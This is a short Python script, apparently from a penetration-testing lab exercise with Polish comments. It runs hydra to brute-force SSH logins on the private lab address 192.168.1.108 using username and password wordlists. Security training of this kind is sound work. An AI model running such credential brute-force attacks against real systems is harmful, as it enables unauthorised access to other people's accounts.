import os
# 6. Przeprowadzić manualną analizę jednej z usług i na podstawie znalezionych
# informacji kontynuować test penetracyjny
# Adress IP 192.168.1.108 pochodzi z zadania Nr. 3
# Usuga ssh pochodzi z zadania 4

os.system('hydra -t 10 -L /root/PycharmProjects/pythonProject/common_users.txt -P /root/PycharmProjects/pythonProject/common_passwords.txt 192.168.1.108 ssh')

